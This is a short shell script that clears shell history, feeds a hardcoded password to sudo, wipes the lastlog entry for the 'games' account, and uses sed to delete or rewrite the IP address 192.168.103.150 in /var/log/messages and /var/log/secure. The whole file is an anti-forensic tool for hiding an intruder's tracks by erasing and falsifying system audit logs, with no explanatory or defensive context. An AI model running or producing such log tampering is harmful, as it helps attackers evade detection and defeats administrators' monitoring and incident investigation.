#!/bin/sh

history -c

echo Aa123456 | sudo -S lastlog -C -u games

echo Aa123456 | sudo -S sed -i '/192.168.103.150/'d /var/log/messages

echo Aa123456 | sudo -S sed -i 's/192.168.103.150/192.168.103.1/g' /var/log/secure